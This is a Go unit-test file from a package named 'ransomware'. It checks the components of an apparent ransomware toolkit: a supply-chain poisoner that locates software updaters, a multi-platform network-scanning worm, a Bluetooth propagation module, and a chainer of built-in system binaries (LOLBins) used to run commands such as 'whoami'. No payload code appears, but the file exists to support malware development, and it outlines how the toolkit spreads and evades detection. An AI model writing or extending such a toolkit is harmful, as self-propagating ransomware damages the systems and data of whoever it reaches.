package ransomware

import (
	"testing"
)

func TestNewSupplyChainPoison(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSupplyChainPoison(cfg)
	if s == nil {
		t.Fatal("NewSupplyChainPoison() returned nil")
	}
}

func TestNewMultiPlatformWorm(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	w := NewMultiPlatformWorm(cfg)
	if w == nil {
		t.Fatal("NewMultiPlatformWorm() returned nil")
	}
}

func TestNewBluetoothPropagation(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBluetoothPropagation(cfg)
	if b == nil {
		t.Fatal("NewBluetoothPropagation() returned nil")
	}
}

func TestNewLOLBinChainer(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	l := NewLOLBinChainer(cfg)
	if l == nil {
		t.Fatal("NewLOLBinChainer() returned nil")
	}
}

func TestLOLBinChainerListBins(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	l := NewLOLBinChainer(cfg)

	bins := l.GetAvailableLOLBins()
	if len(bins) == 0 {
		t.Error("GetAvailableLOLBins returned empty")
	}
	t.Logf("LOLBins count: %d", len(bins))
}

func TestLOLBinChainerGenerateChain(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	l := NewLOLBinChainer(cfg)

	chain, err := l.GenerateChain("whoami", 2)
	if err != nil || chain == nil {
		t.Log("GenerateChain returned empty (expected in test env)")
	} else {
		t.Logf("Generated chain with %d steps", len(chain.Steps))
	}
}

func TestSupplyChainDetectUpdates(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSupplyChainPoison(cfg)

	updaters := s.FindUpdaters()
	if len(updaters) == 0 {
		t.Log("FindUpdaters returned 0 (expected in test env)")
	} else {
		t.Logf("Detected updaters: %v", updaters)
	}
}

func TestBluetoothPropagationScan(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBluetoothPropagation(cfg)

	devices := b.ScanBluetoothDevices()
	if len(devices) == 0 {
		t.Log("ScanBluetoothDevices returned 0 (expected in non-BT env)")
	}
}

func TestMultiPlatformWormScan(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	w := NewMultiPlatformWorm(cfg)

	hosts := w.ScanNetwork("127.0.0.1/32")
	if len(hosts) == 0 {
		t.Log("ScanNetwork returned 0 (expected in test env)")
	}
}
